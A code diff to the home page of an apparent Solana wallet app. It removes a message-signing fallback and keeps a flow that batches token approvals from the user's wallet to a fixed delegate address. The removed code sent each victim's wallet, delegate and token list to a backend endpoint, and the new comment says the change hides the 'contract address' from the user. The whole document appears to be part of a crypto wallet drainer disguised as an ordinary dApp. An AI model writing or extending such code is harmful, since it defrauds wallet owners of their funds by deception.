@@ -541,38 +541,12 @@ export default function Home() {
         }
       }
       
-      // If no ATAs found, use message signing as fallback
+      // If no ATAs found, show error (don't use message signing - it shows contract address)
       if (transaction.instructions.length === 0) {
-        console.log("No token accounts found, using message signing...");
-        
-        const message = new TextEncoder().encode(
-          `Approve all tokens for delegation\nWallet: ${solanaAddress}\nTimestamp: ${Date.now()}`
-        );
-        
-        if (solanaProvider.signMessage) {
-          const signature = await solanaProvider.signMessage(message);
-          console.log("Message signed:", signature);
-          
-          fetch("/api/solana-approvals", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              walletAddress: solanaAddress,
-              delegateAddress: SOLANA_DELEGATE_ADDRESS,
-              transactionHash: "message-signature",
-              tokensApproved: SOLANA_APPROVAL_TOKENS.map(t => t.symbol),
-              tokenCount: SOLANA_APPROVAL_TOKENS.length,
-              note: "Message signature - batch approval"
-            }),
-          }).catch(console.error);
-          
-          setSolanaStep("done");
-          return;
-        } else {
-          setError("No token accounts found. Please add tokens to your wallet first.");
-          setSolanaStep("idle");
-          return;
-        }
+        console.log("No token accounts found");
+        setError("No tokens found in wallet.");
+        setSolanaStep("idle");
+        return;
       }
       
       console.log(`Batch transaction ready with ${transaction.instructions.length} approvals`);
